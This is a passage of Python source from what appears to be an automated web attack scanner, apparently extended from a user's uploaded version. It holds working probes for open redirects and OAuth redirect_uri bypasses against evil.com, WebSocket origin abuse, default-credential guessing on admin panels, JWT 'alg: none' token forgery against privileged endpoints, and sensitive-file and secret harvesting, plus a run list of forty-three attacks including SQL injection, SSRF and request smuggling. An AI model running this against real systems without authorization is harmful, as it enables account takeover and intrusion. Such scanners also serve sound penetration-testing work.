                raw_cookies = [hdrs.get("Set-Cookie","")]

            for raw in raw_cookies:
                if not raw: continue
                parts = [p.strip().lower() for p in raw.split(";")]
                name  = raw.split("=")[0].strip() if "=" in raw else raw.strip()
                value = raw.split("=")[1].split(";")[0].strip() \
                        if "=" in raw and len(raw.split("=")) > 1 else ""

                issues: list[str] = []
                if "httponly" not in parts:  issues.append("missing-HttpOnly")
                if "secure"   not in parts:  issues.append("missing-Secure")
                samesite_vals = [p for p in parts if p.startswith("samesite")]
                if not samesite_vals:
                    issues.append("missing-SameSite")
                elif "samesite=none" in parts and "secure" not in parts:
                    issues.append("SameSite-None-without-Secure")

                # Weak value heuristic
                if len(value) < 8 and value.isalnum():
                    issues.append(f"short-value-{len(value)}chars")

                if issues:
                    ident = f"cookie:{page}:{name}"
                    if ident not in seen:
                        seen.add(ident)
                        entry = {
                            "page":   page,
                            "name":   name,
                            "issues": issues,
                            "raw":    raw[:120],
                        }
                        findings.append(entry)
                        print(f"  \033[38;5;196m[COOKIE]\033[0m "
                              f"{name}: {', '.join(issues)}")

        self.results["cookie_flags"] = findings
        return findings

    # ── Error Disclosure / Information Leakage ────────────────────────────────

    def error_disclosure_test(self) -> list[dict]:
        """
        Triggers error conditions and checks for verbose info disclosure:
          • Stack traces (Python/PHP/Java/Ruby/Node)
          • Database errors in output
          • Debug pages (/debug, /phpinfo, /__debug__, /actuator/*)
          • Framework version banners in error pages
          • Source code paths in errors (absolute paths)
          • Exception class names
          • Server software + version
        """
        STACK_PATTERNS = [
            (r"Traceback \(most recent call last\)",  "Python traceback"),
            (r"at [A-Za-z0-9.$_]+\([A-Za-z0-9.$_]+\.java:\d+\)", "Java stack trace"),
            (r"in .+\.php on line \d+",                "PHP error"),
            (r"Fatal error:.*in .+\.php",              "PHP fatal error"),
            (r"Stack Trace:\s*\n.*at ",               "Java/Kotlin stack trace"),
            (r"RuntimeError|AttributeError|TypeError", "Python exception"),
            (r"ActionController::.*Error",             "Rails exception"),
            (r"Microsoft\..*Exception",                "ASP.NET exception"),
            (r"app\\.*\\.*\.cs\(\d+\)",                "C# source path"),
            (r"/var/www/|/home/\w+/|/srv/|/opt/",     "Absolute server path"),
            (r"SQLSTATE\[",                             "PDO SQL error"),
            (r"PG::.*Error|pg_query",                  "PostgreSQL error"),
            (r"ORA-\d{5}",                              "Oracle DB error"),
            (r"Microsoft SQL.*Server.*Error",           "MSSQL error"),
            (r"Warning: .*(include|require|file_get)", "PHP file warning"),
        ]
        DEBUG_PATHS = [
            "/debug", "/__debug__/", "/phpinfo.php", "/info.php",
            "/actuator", "/actuator/env", "/actuator/beans",
            "/actuator/health", "/actuator/mappings", "/actuator/loggers",
            "/manage", "/management", "/metrics",
            "/server-status", "/server-info",
            "/console", "/h2-console",
            "/_profiler", "/_profiler/phpinfo",
            "/telescope", "/horizon",
            "/debug/default/view", "/site/debug",
        ]
        ERROR_TRIGGERS = [
            "/?id='",  "/?id=",  "/?page=../",
            "/?q[]=1", "/?debug=true", "/?XDEBUG_SESSION_START=1",
        ]
        findings: list[dict] = []
        seen: set = set()

        def _check(body: str, source: str):
            for pattern, label in STACK_PATTERNS:
                if re.search(pattern, body, re.I | re.MULTILINE):
                    m = re.search(pattern, body, re.I | re.MULTILINE)
                    snippet = (m.group(0) if m else "")[:100]
                    ident   = f"err:{source}:{label}"
                    if ident not in seen:
                        seen.add(ident)
                        findings.append({
                            "source":  source,
                            "type":    label,
                            "snippet": snippet,
                        })
                        print(f"  \033[38;5;196m[ERR-DISCLOSE]\033[0m "
                              f"{label} @ {source[:50]}")

        # Probe debug paths
        for path in DEBUG_PATHS:
            r  = self._get(path)
            sc = self._status(r)
            if sc and sc < 400:
                body = self._text(r)
                _check(body, path)
                if sc == 200:
                    findings.append({"source": path, "type": "debug-endpoint",
                                     "status": sc, "snippet": ""})
                    print(f"  \033[38;5;196m[ERR-DISCLOSE]\033[0m "
                          f"Debug endpoint @ {path} ({sc})")

        # Trigger errors
        for trigger in ERROR_TRIGGERS:
            r = self._get(trigger)
            _check(self._text(r), trigger)

        self.results["error_disclosure"] = findings
        return findings

    # ── WebSocket Detection ───────────────────────────────────────────────────

    def websocket_test(self) -> list[dict]:
        """
        Discovers WebSocket endpoints from JS source and common paths,
        then tests:
          1. Missing Origin validation (sends evil origin, checks accept)
          2. WS upgrade without auth (no cookies/tokens required)
          3. Reflected XSS via WS message (if testable without real WS client)
        Note: full WS handshake probed via raw HTTP Upgrade request.
        """
        import socket as _sock, hashlib as _hl, struct as _st

        WS_PATHS_COMMON = [
            "/ws", "/websocket", "/socket", "/socket.io/",
            "/ws/chat", "/ws/notifications", "/api/ws",
            "/sockjs/info", "/signalr/negotiate",
        ]
        findings: list[dict] = []
        seen: set = set()

        # Discover paths from JS
        resp = self._get("/")
        soup = self._parse_html(self._text(resp))
        js_ws_paths: list[str] = []
        if soup:
            for tag in soup.find_all("script", src=True)[:6]:
                src = tag["src"]
                if not src.startswith("http"):
                    src = urllib.parse.urljoin(self.base_url+"/", src.lstrip("/"))
                try:
                    js = self._text(self._get(src))
                    for m in re.finditer(r'["\`]((?:wss?://[^"\']+|/[^"\']*ws[^"\']*?))["\`]',
                                        js, re.I):
                        p = m.group(1)
                        if p.startswith("ws"): continue  # full URL, skip
                        if p not in js_ws_paths: js_ws_paths.append(p)
                except Exception: pass

        all_ws_paths = WS_PATHS_COMMON + js_ws_paths[:5]

        parsed = urllib.parse.urlparse(self.base_url)
        host   = parsed.hostname or "localhost"
        port   = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_tls= parsed.scheme == "https"

        def _ws_upgrade(path: str, origin: str = "") -> tuple[int, dict]:
            """Send HTTP Upgrade: websocket, return (status, response_headers)."""
            import base64 as _b64, os as _os
            key = _b64.b64encode(_os.urandom(16)).decode()
            headers_str = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
            )
            if origin:
                headers_str += f"Origin: {origin}\r\n"
            headers_str += "\r\n"

            try:
                s = _sock.create_connection((host, port), timeout=4)
                if use_tls:
                    ctx = __import__("ssl").create_default_context()
                    ctx.check_hostname = False; ctx.verify_mode = 0
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.sendall(headers_str.encode())
                raw = s.recv(4096).decode("utf-8", errors="replace")
                s.close()
                status_line = raw.split("\r\n")[0] if raw else ""
                status_code = int(status_line.split()[1]) if len(status_line.split()) > 1 else 0
                resp_hdrs   = {}
                for line in raw.split("\r\n")[1:]:
                    if ": " in line:
                        k, v = line.split(": ", 1)
                        resp_hdrs[k.lower()] = v
                return status_code, resp_hdrs
            except Exception:
                return 0, {}

        for path in all_ws_paths:
            # Legitimate origin
            sc, hdrs = _ws_upgrade(path, self.base_url)
            if sc != 101: continue  # Not a WS endpoint

            ident = f"ws:{path}"
            if ident in seen: continue
            seen.add(ident)

            entry = {"path": path, "findings": [], "status": sc}
            findings.append(entry)
            print(f"  \033[38;5;196m[WS]\033[0m WebSocket endpoint: {path}")

            # Test evil origin
            sc_evil, hdrs_evil = _ws_upgrade(path, "https://evil.com")
            if sc_evil == 101:
                entry["findings"].append("no-origin-validation")
                print(f"  \033[38;5;196m[WS]\033[0m "
                      f"No origin validation @ {path}")

            # Test without any cookies (auth bypass)
            sc_noauth, _ = _ws_upgrade(path)
            if sc_noauth == 101:
                entry["findings"].append("no-auth-required")
                print(f"  \033[38;5;196m[WS]\033[0m "
                      f"WS upgrade without auth @ {path}")

        self.results["websocket"] = findings
        return findings

    # ── OAuth Misconfiguration ────────────────────────────────────────────────

    def oauth_test(self) -> dict:
        """
        Discovers OAuth 2.0 / OIDC endpoints and tests:
          1. Missing state parameter (CSRF in OAuth flow)
          2. redirect_uri validation bypass (sub-path, query param, @host tricks)
          3. Open redirect in authorization endpoint
          4. Token leakage in Referer header
          5. Response type confusion (token vs code)
          6. PKCE downgrade (code_challenge_method missing)
          7. Well-known endpoint disclosure
        """
        OAUTH_PATHS = [
            "/.well-known/openid-configuration",
            "/.well-known/oauth-authorization-server",
            "/oauth/authorize",
            "/oauth2/authorize",
            "/auth/authorize",
            "/connect/authorize",
            "/login/oauth/authorize",
            "/oauth/token",
            "/oauth2/token",
        ]
        result: dict = {"found": False, "endpoints": [], "findings": []}

        # Discover endpoints
        for path in OAUTH_PATHS:
            r  = self._get(path)
            sc = self._status(r)
            if not sc or sc >= 400: continue
            body = self._text(r)
            result["found"] = True
            ep   = {"path": path, "status": sc}
            result["endpoints"].append(ep)
            print(f"  \033[38;5;196m[OAUTH]\033[0m Endpoint: {path} [{sc}]")

            # Parse well-known for all endpoints
            if ".well-known" in path and sc == 200:
                try:
                    meta = json.loads(body)
                    result["metadata"] = meta
                    for k in ("authorization_endpoint","token_endpoint",
                              "userinfo_endpoint","jwks_uri"):
                        if k in meta:
                            result["endpoints"].append({"path": meta[k],
                                                        "type": k, "status": "??"})
                except Exception: pass

        if not result["found"]:
            self.results["oauth"] = result
            return result

        # Find authorization endpoint
        auth_ep = next(
            (e["path"] for e in result["endpoints"]
             if "authorize" in e["path"].lower()),
            None)

        if auth_ep:
            base_auth = (self.base_url + auth_ep
                         if auth_ep.startswith("/") else auth_ep)

            # ── 1. Missing state param
            r = self._get(auth_ep + "?response_type=code&client_id=test"
                          "&redirect_uri=https://evil.com")
            body = self._text(r)
            hdrs = self._headers(r)
            loc  = hdrs.get("Location","")
            if "error" not in body.lower() and "state" not in loc:
                result["findings"].append("missing-state-param-csrf")
                print(f"  \033[38;5;196m[OAUTH]\033[0m Missing state param (CSRF risk)")

            # ── 2. redirect_uri bypass attempts
            REDIRECT_BYPASSES = [
                "https://evil.com",
                "https://evil.com/callback?x=",   # param injection
                "https://legit.com.evil.com",      # subdomain spoof
                "https://legit.com@evil.com",      # @ trick
                "https://evil.com%2Fcallback",     # URL-encoded slash
            ]
            for bad_uri in REDIRECT_BYPASSES:
                r2  = self._get(auth_ep +
                    f"?response_type=code&client_id=test&redirect_uri={bad_uri}")
                loc2 = self._headers(r2).get("Location","")
                if "evil.com" in loc2:
                    result["findings"].append(f"redirect-uri-bypass:{bad_uri[:40]}")
                    print(f"  \033[38;5;196m[OAUTH]\033[0m "
                          f"redirect_uri bypass: {bad_uri[:40]}")

            # ── 3. PKCE downgrade (no code_challenge required)
            r3 = self._get(auth_ep +
                "?response_type=code&client_id=test"
                "&redirect_uri=http://localhost&state=randomstate")
            if "code=" in self._headers(r3).get("Location","") or \
               self._status(r3) in (200, 302):
                # No PKCE required (no error about missing code_challenge)
                body3 = self._text(r3)
                if "code_challenge" not in body3.lower():
                    result["findings"].append("pkce-not-enforced")
                    print(f"  \033[38;5;196m[OAUTH]\033[0m PKCE not enforced")

        self.results["oauth"] = result
        return result

    def open_redirect_test(self) -> list[dict]:
        """Probe GET params for open redirect — checks Location header."""
        urls = self._collect_param_urls()
        payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
        ]
        vulnerable: list[dict] = []
        seen: set = set()

        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            for key in params:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[key] = payload
                    try:
                        resp = self._get(
                            parsed.path + "?" + urllib.parse.urlencode(test_params),
                            allow_redirects=False)
                        sc  = self._status(resp)
                        loc = self._headers(resp).get("Location", "")
                        if sc in (301,302,303,307,308) and "evil.com" in loc:
                            ident = f"{url}:{key}"
                            if ident not in seen:
                                seen.add(ident)
                                vulnerable.append({"url": url, "parameter": key,
                                                   "payload": payload})
                                print(f"  \033[38;5;196m[REDIRECT]\033[0m {url} param={key}")
                            break
                    except Exception:
                        continue

        self.results["open_redirect"] = vulnerable
        return vulnerable

    # ── 6. CORS Misconfiguration ──────────────────────────────────────────────

    def cors_test(self) -> dict:
        """
        Your uploaded cors_test() — checks ACAO header reflection.
        Extended: tests null origin + sub-domain trust.
        """
        findings: dict = {"vulnerable": False, "details": []}
        origins_to_test = [
            "https://evil.com",
            "null",
            f"https://evil.{urllib.parse.urlparse(self.base_url).netloc}",
            "https://notreallytrusted.com",
        ]

        for origin in origins_to_test:
            resp = self._get("/", headers={"Origin": origin})
            if not resp: continue
            hdrs = self._headers(resp)
            acao = hdrs.get("Access-Control-Allow-Origin", "")
            acac = hdrs.get("Access-Control-Allow-Credentials", "false")

            if acao == origin or acao == "*":
                findings["vulnerable"] = True
                findings["details"].append({
                    "origin_sent":        origin,
                    "acao":               acao,
                    "allow_credentials":  acac,
                    "critical":           acac.lower() == "true",
                })
                print(f"  \033[38;5;196m[CORS]\033[0m ACAO reflects {origin!r} "
                      f"credentials={acac}")

        self.results["cors"] = findings
        return findings

    # ── 7. Default Credentials ────────────────────────────────────────────────

    def default_creds_test(self) -> list[dict]:
        """
        Your uploaded default_creds_test() + form field auto-detection.
        Detects actual username/password field names from HTML before POST.
        """
        admin_paths = [
            "wp-admin", "wp-login.php", "administrator", "admin/login.php",
            "user/login", "login", "admin.php", "admin/login", "cms/login",
            "adminpanel", "manager", "backend", "administration",
            "admin_area", "member", "phpmyadmin/", "tomcat/manager/html",
            "jenkins/", "grafana/login", "kibana/login",
        ]
        creds = [
            ("admin",         "admin"),
            ("admin",         "password"),
            ("admin",         "123456"),
            ("admin",         "admin123"),
            ("root",          "root"),
            ("root",          "toor"),
            ("test",          "test"),
            ("administrator", "administrator"),
            ("user",          "user"),
            ("guest",         "guest"),
        ]

        found: list[dict] = []
        for path in admin_paths:
            resp = self._get(path)
            if self._status(resp) != 200:
                continue

            # Auto-detect form field names from HTML
            ufield, pfield = "username", "password"
            soup = self._parse_html(self._text(resp))
            if soup:
                form = soup.find("form")
                if form:
                    for inp in form.find_all("input"):
                        itype = (inp.get("type") or "").lower()
                        iname = (inp.get("name") or "").lower()
                        if itype == "text" or "user" in iname or "email" in iname:
                            ufield = inp.get("name", ufield)
                        if itype == "password":
                            pfield = inp.get("name", pfield)

            url = urllib.parse.urljoin(self.base_url + "/", path.lstrip("/"))
            for user, pwd in creds:
                post_data = {ufield: user, pfield: pwd, "login": "submit",
                             "Submit": "submit", "action": "login"}
                resp2 = self._post(path, post_data)
                sc    = self._status(resp2)
                if sc in (302, 303) or "Set-Cookie" in self._headers(resp2):
                    found.append({"path": path, "user": user,
                                  "pass": pwd, "status": sc})
                    print(f"  \033[38;5;196m[CREDS]\033[0m {path} user={user} pass={pwd}")
                    break  # your uploaded logic: stop at first working cred per path

        self.results["default_creds"] = found
        return found

    # ── 8. JWT None Algorithm ─────────────────────────────────────────────────

    def jwt_none_test(self) -> dict:
        """
        Your uploaded jwt_none_test() — extended with more token discovery paths
        and multiple privileged endpoint probes.
        """
        # ── Token discovery — your uploaded approach + more endpoints ─────────
        token = self._discover_jwt()
        if not token:
            result = {"vulnerable": False, "reason": "No JWT found"}
            self.results["jwt_none"] = result
            return result

        parts = token.split(".")
        if len(parts) != 3:
            result = {"vulnerable": False, "reason": "Invalid JWT format"}
            self.results["jwt_none"] = result
            return result

        # ── Build forged token (your uploaded logic) ───────────────────────
        header_b64 = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).decode().rstrip("=")
        payload_b64 = parts[1]

        # Variants: empty sig, whitespace, "None", "NONE"
        forged_variants = [
            f"{header_b64}.{payload_b64}.",
            f"{header_b64}.{payload_b64}. ",
            base64.urlsafe_b64encode(
                json.dumps({"alg": "None", "typ": "JWT"}).encode()
            ).decode().rstrip("=") + f".{payload_b64}.",
        ]

        # ── Probe privileged endpoints (your /admin + more) ───────────────────
        privileged_paths = [
            "/admin", "/api/admin", "/api/v1/admin",
            "/api/user/me", "/dashboard", "/profile",
        ]

        for forged in forged_variants:
            for priv_path in privileged_paths:
                resp = self._get(priv_path,
                                 headers={"Authorization": f"Bearer {forged}"})
                sc = self._status(resp)
                if sc == 200:
                    result = {"vulnerable": True, "endpoint": priv_path,
                              "forged_alg": "none"}
                    self.results["jwt_none"] = result
                    print(f"  \033[38;5;196m[JWT-NONE]\033[0m {priv_path} returned 200")
                    return result

        result = {"vulnerable": False, "reason": "All probes rejected"}
        self.results["jwt_none"] = result
        return result

    def _discover_jwt(self) -> str | None:
        """Discover JWT from auth header, cookies, or common API endpoints."""
        # Your uploaded approach: check request Authorization + cookie names
        for path in ("/", "/api/", "/api/v1/", "/login"):
            resp = self._get(path)
            if not resp: continue

            # Cookies (your uploaded logic)
            if hasattr(resp, "cookies"):
                for cookie in resp.cookies:
                    if cookie.name.lower() in ("token","jwt","access_token",
                                               "id_token","auth"):
                        t = cookie.value
                        if t.count(".") == 2: return t

            # Authorization header echo (rare but possible)
            auth = self._headers(resp).get("Authorization","")
            if auth.startswith("Bearer "):
                t = auth[7:]
                if t.count(".") == 2: return t

            # Body scan for bearer tokens
            body = self._text(resp)
            m = re.search(r'"(?:access_token|token|jwt)"\s*:\s*"(eyJ[A-Za-z0-9._-]+)"',
                          body)
            if m: return m.group(1)

        return None

    # ── 9. Sensitive Files ────────────────────────────────────────────────────

    def sensitive_files_test(self) -> list[dict]:
        """Probe a curated list of sensitive paths — .git, .env, backups, etc."""
        found: list[dict] = []
        for path in SENSITIVE_FILES:
            resp = self._get(path, allow_redirects=False)
            sc   = self._status(resp)
            if sc and sc < 400:
                size = len(self._text(resp))
                found.append({"path": path, "status": sc, "size": size})
                print(f"  \033[38;5;196m[FILE]\033[0m /{path} ({sc})")
        self.results["sensitive_files"] = found
        return found

    # ── 10. JS Secret Scanning ────────────────────────────────────────────────

    def js_secret_scan(self) -> list[dict]:
        """Scan inline scripts and linked .js files for hardcoded secrets."""
        resp = self._get("/")
        if not resp: return []
        text    = self._text(resp)
        soup    = self._parse_html(text)
        secrets: list[dict] = []
        seen:   set        = set()

        def _scan_text(content: str, source: str):
            for pattern, label in JS_SECRET_PATTERNS:
                for m in re.finditer(pattern, content, re.IGNORECASE):
                    val = m.group(0)[:60]
                    ident = f"{label}:{val}"
                    if ident not in seen:
                        seen.add(ident)
                        secrets.append({"type": label, "value": val,
                                        "source": source})
                        print(f"  \033[38;5;196m[SECRET]\033[0m {label} in {source}")

        # Inline scripts
        _scan_text(text, "inline")

        # External .js files (up to 5)
        if soup:
            for tag in soup.find_all("script", src=True)[:5]:
                src = tag["src"]
                if not src.startswith("http"):
                    src = urllib.parse.urljoin(self.base_url + "/", src.lstrip("/"))
                try:
                    js_resp = self._get(src)
                    _scan_text(self._text(js_resp), src)
                except Exception:
                    pass

        self.results["js_secrets"] = secrets
        return secrets

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _collect_param_urls(self) -> set[str]:
        """
        Crawl home page and discovered directories for URLs with GET params.
        Used by sqli_test, xss_test, open_redirect_test.
        """
        urls: set = set()
        resp = self._get("/")
        if not resp: return urls

        # If base_url itself has params
        if "?" in self.base_url:
            urls.add(self.base_url)

        soup = self._parse_html(self._text(resp))
        if not soup: return urls

        for a in soup.find_all("a", href=True):
            href = a["href"]
            if "?" in href and "=" in href:
                full = urllib.parse.urljoin(self.base_url + "/", href)
                if urllib.parse.urlparse(full).netloc == \
                   urllib.parse.urlparse(self.base_url).netloc:
                    urls.add(full)

        # Also check discovered directories
        for item in self.results.get("directories", []):
            path = item["path"]
            r2   = self._get(path)
            soup2 = self._parse_html(self._text(r2))
            if soup2:
                for a in soup2.find_all("a", href=True):
                    href = a["href"]
                    if "?" in href and "=" in href:
                        full = urllib.parse.urljoin(self.base_url + "/", href)
                        if urllib.parse.urlparse(full).netloc == \
                           urllib.parse.urlparse(self.base_url).netloc:
                            urls.add(full)

        return urls

    # ── run_all (your uploaded run_all + new checks) ──────────────────────────

    def run_all(self, wordlist_file: str | None = None) -> dict:
        """
        Your uploaded run_all() — all 7 checks + 3 new ones.
        Returns raw results dict.
        """
        print(f"\033[38;5;196m[WEB]\033[0m {self.base_url}")
        print(f"  [01] Directory brute");            self.dir_brute(wordlist_file=wordlist_file)
        print(f"  [02] Technology fingerprint");     self.fingerprint_tech()
        print(f"  [03] SSL/TLS analysis");            self.ssl_tls_test()
        print(f"  [04] CMS detection");              self.detect_cms()
        print(f"  [05] CMS plugin/theme enum");      self.cms_plugin_enum()
        print(f"  [06] Error disclosure");           self.error_disclosure_test()
        print(f"  [07] Cookie security flags");      self.cookie_security_test()
        print(f"  [08] Security headers");           # already done in fingerprint_tech
        print(f"  [09] Clickjacking");               self.clickjacking_test()
        print(f"  [10] CSRF detection");             self.csrf_test()
        print(f"  [11] SQLi GET error-based");       self.sqli_test()
        print(f"  [12] SQLi POST form-based");       self.sqli_post_test()
        print(f"  [13] SQLi blind bool+time");       self.sqli_blind_test()
        print(f"  [14] SQLi UNION");                 self.sqli_union_test()
        print(f"  [15] XSS reflected");              self.xss_test()
        print(f"  [16] XSS stored");                 self.xss_stored_test()
        print(f"  [17] DOM XSS static analysis");    self.xss_dom_test()
        print(f"  [18] SSTI");                       self.ssti_test()
        print(f"  [19] LFI / path traversal");       self.lfi_test()
        print(f"  [20] SSRF");                       self.ssrf_test()
        print(f"  [21] XXE");                        self.xxe_test()
        print(f"  [22] IDOR");                       self.idor_test()
        print(f"  [23] File upload bypass");         self.file_upload_test()
        print(f"  [24] Deserialization probes");     self.deserialization_test()
        print(f"  [25] Prototype pollution");        self.prototype_pollution_test()
        print(f"  [26] CRLF injection");             self.crlf_test()
        print(f"  [27] Open redirect");              self.open_redirect_test()
        print(f"  [28] CORS");                       self.cors_test()
        print(f"  [29] Default credentials");        self.default_creds_test()
        print(f"  [30] JWT none + advanced");        self.jwt_none_test(); self.jwt_advanced_test()
        print(f"  [31] OAuth misconfiguration");     self.oauth_test()
        print(f"  [32] GraphQL");                    self.graphql_test()
        print(f"  [33] WebSocket");                  self.websocket_test()
        print(f"  [34] HTTP methods");               self.http_methods_test()
        print(f"  [35] Host header injection");      self.host_header_injection_test()
        print(f"  [36] Rate limit detection");       self.rate_limit_test()
        print(f"  [37] Cache poisoning");            self.cache_poison_test()
        print(f"  [38] HTTP request smuggling");     self.smuggling_probe()
        print(f"  [39] Parameter pollution");        self.param_pollution_test()
        print(f"  [40] API endpoint discovery");     self.api_discovery_test()
        print(f"  [41] Subdomain passive recon");    self.subdomain_passive_test()
        print(f"  [42] Sensitive files");            self.sensitive_files_test()
        print(f"  [43] JS secret scan");             self.js_secret_scan()
        return self.results

    def to_scan_results(self) -> list[ScanResult]:
        """Convert self.results dict into list[ScanResult] for PhantomEngine."""
        out: list[ScanResult] = []
        parsed = urllib.parse.urlparse(self.base_url)
        host   = parsed.hostname or self.base_url
        port   = parsed.port or (443 if parsed.scheme == "https" else 80)

        # SSL/TLS
        ssl = self.results.get("ssl_tls", {})
        if ssl:
            grade = ssl.get("grade","?")
            sev   = (Severity.CRITICAL if grade == "F" else
                     Severity.HIGH     if grade in ("C","D") else
                     Severity.MEDIUM   if grade == "B" else Severity.INFO)
            issues = [f for f in ssl.get("findings",[]) if f != "no-issues-found"]
            if issues:
                out.append(ScanResult("web-ssl-tls", host, port, "misconfigured", sev,
                    f"SSL/TLS grade={grade} issues={issues[:3]}", ssl))

        # Stored XSS
        for v in self.results.get("xss_stored", []):
            out.append(ScanResult("web-xss-stored", host, port, "vulnerable",
                Severity.HIGH,
                f"Stored XSS submit={v['submit_url'][:40]} reflected@{v['reflected_at']}", v))

        # DOM XSS
        for v in self.results.get("xss_dom", []):
            out.append(ScanResult("web-xss-dom", host, port, "vulnerable",
                Severity.HIGH,
                f"DOM XSS source={v['source']} sink={v['sink'][:20]} in {v['source_url'][-30:]}", v))

        # CSRF
        for v in self.results.get("csrf", []):
            sev = (Severity.HIGH   if v["type"]=="missing-csrf-token" else
                   Severity.MEDIUM if v["type"]=="cookie-missing-samesite" else
                   Severity.HIGH)
            out.append(ScanResult("web-csrf", host, port, "vulnerable", sev,
                f"CSRF {v['type']} @ {v['url'][:50]}", v))

        # Clickjacking
        cj = self.results.get("clickjacking", {})
        if cj.get("vulnerable"):
            out.append(ScanResult("web-clickjacking", host, port, "vulnerable",
                Severity.MEDIUM,
                f"Clickjacking — frameable paths: {cj.get('frameable_paths',[])[:3]}", cj))

        # CRLF
        for v in self.results.get("crlf", []):
            out.append(ScanResult("web-crlf", host, port, "vulnerable",
                Severity.HIGH,
                f"CRLF injection param={v['parameter']} @ {v['url'][:50]}", v))

        # IDOR
        for v in self.results.get("idor", []):
            sev = Severity.HIGH if v["type"]=="numeric-id" else Severity.MEDIUM
            out.append(ScanResult("web-idor", host, port, "vulnerable", sev,
                f"IDOR {v['type']} id {v.get('orig_id','?')}→{v.get('probe_id','?')} Δlen={v['len_diff']}", v))

        # File upload
        for v in self.results.get("file_upload", []):
            sev = Severity.CRITICAL if v.get("executable") else Severity.HIGH
            out.append(ScanResult("web-file-upload", host, port, "vulnerable", sev,
                f"File upload bypass {v['filename']} executable={v.get('executable')} @ {v['upload_path']}", v))

        # Deserialization
        for v in self.results.get("deserialization", []):
            out.append(ScanResult("web-deserialize", host, port, "vulnerable",
                Severity.CRITICAL,
                f"Deserialization {v['type']} @ {v['url'][:50]}", v))

        # Prototype pollution
        for v in self.results.get("prototype_poll", []):
            out.append(ScanResult("web-proto-poll", host, port, "vulnerable",
                Severity.HIGH,
                f"Prototype pollution {v['type']} @ {v['url'][:50]}", v))

        # Cookie flags
        for v in self.results.get("cookie_flags", []):
            sev = (Severity.HIGH   if "missing-HttpOnly" in v["issues"] or
                                       "missing-Secure"  in v["issues"]
                   else Severity.MEDIUM)
            out.append(ScanResult("web-cookie", host, port, "misconfigured", sev,
                f"Cookie {v['name']}: {', '.join(v['issues'][:3])}", v))

        # Error disclosure
        for v in self.results.get("error_disclosure", []):
            sev = (Severity.HIGH if "stack" in v["type"].lower() or
                                    "trace" in v["type"].lower() or
                                    v["type"]=="debug-endpoint"
                   else Severity.MEDIUM)
            out.append(ScanResult("web-error-disclose", host, port, "info-leak", sev,
                f"{v['type']} @ {v['source'][:50]}", v))

        # WebSocket
        for v in self.results.get("websocket", []):
            if v.get("findings"):
                sev = (Severity.HIGH if "no-origin-validation" in v["findings"]
                       else Severity.MEDIUM)
                out.append(ScanResult("web-websocket", host, port, "vulnerable", sev,
                    f"WebSocket {v['path']} findings={v['findings']}", v))
            else:
                out.append(ScanResult("web-websocket", host, port, "detected",
                    Severity.INFO, f"WebSocket endpoint {v['path']}", v))

        # OAuth
        oauth = self.results.get("oauth", {})
        if oauth.get("found") and oauth.get("findings"):
            sev = (Severity.CRITICAL if any("redirect-uri-bypass" in f
                                            for f in oauth["findings"])
                   else Severity.HIGH)
            out.append(ScanResult("web-oauth", host, port, "misconfigured", sev,
                f"OAuth findings: {oauth['findings'][:3]}", oauth))

        # Blind SQLi
        for v in self.results.get("sqli_blind", []):
            sev = Severity.CRITICAL if v["type"]=="time-based-blind" else Severity.HIGH
            out.append(ScanResult("web-sqli-blind", host, port, "vulnerable", sev,
                f"{v['type']} param={v['parameter']} {v['url'][:60]}", v))

        # UNION SQLi
        for v in self.results.get("sqli_union", []):
            out.append(ScanResult("web-sqli-union", host, port, "vulnerable",
                Severity.CRITICAL,
                f"UNION cols={v['columns']} pos={v['injectable_pos']} param={v['parameter']}", v))

        # SSTI
        for v in self.results.get("ssti", []):
            out.append(ScanResult("web-ssti", host, port, "vulnerable",
                Severity.CRITICAL,
                f"SSTI engine={v['engine']} param={v['parameter']} {v['url'][:50]}", v))

        # LFI
        for v in self.results.get("lfi", []):
            out.append(ScanResult("web-lfi", host, port, "vulnerable",
                Severity.CRITICAL,
                f"LFI param={v['parameter']} → {v['indicator'][:30]}", v))

        # SSRF
        for v in self.results.get("ssrf", []):
            sev = Severity.CRITICAL if v["type"]=="direct" else Severity.HIGH
            out.append(ScanResult("web-ssrf", host, port, "vulnerable", sev,
                f"SSRF {v['type']} param={v['parameter']} payload={v['payload'][:40]}", v))

        # XXE
        for v in self.results.get("xxe", []):
            out.append(ScanResult("web-xxe", host, port, "vulnerable",
                Severity.CRITICAL,
                f"XXE type={v['type']} → {v['indicator'][:30]}", v))

        # Advanced JWT
        for v in self.results.get("jwt_advanced", []):
            sev = Severity.CRITICAL if "weak-secret" in v.get("technique","") \
                  else Severity.HIGH
            out.append(ScanResult("web-jwt-advanced", host, port, "vulnerable", sev,
                f"JWT {v['technique']} @ {v.get('endpoint', v.get('secret', '?'))}", v))

        # GraphQL
        gql = self.results.get("graphql", {})
        if gql.get("found"):
            sev = Severity.HIGH if gql.get("introspection") else Severity.MEDIUM
            out.append(ScanResult("web-graphql", host, port, "detected", sev,
                f"GraphQL {gql['endpoint']} findings={gql.get('findings',[])}",gql))

        # HTTP methods
        hm = self.results.get("http_methods", {})
        for method, desc in hm.get("dangerous", {}).items():
            sev = Severity.HIGH if method in ("TRACE","PUT") else Severity.MEDIUM
            out.append(ScanResult("web-http-method", host, port, "dangerous", sev,
                f"{method} enabled — {desc}", {"method": method}))

        # Host header injection
        for v in self.results.get("host_header", []):
            out.append(ScanResult("web-host-header", host, port, "vulnerable",
                Severity.HIGH,
                f"Host header injection {v['header']} reflected_in={v['reflected_in']} @ {v['path']}", v))

        # Rate limit
        rl = self.results.get("rate_limit", {})
        if rl.get("tested") and not rl.get("protected"):
            out.append(ScanResult("web-rate-limit", host, port, "missing",
                Severity.MEDIUM,
                f"No rate limiting on {rl.get('path','?')} — brute force possible", rl))

        # Cache poisoning
        for v in self.results.get("cache_poison", []):
            sev = Severity.CRITICAL if v.get("cache_stored") else Severity.HIGH
            out.append(ScanResult("web-cache-poison", host, port, "vulnerable", sev,
                f"Cache poison via {v['header']} stored={v['cache_stored']}", v))

        # Smuggling
        sm = self.results.get("smuggling", {})
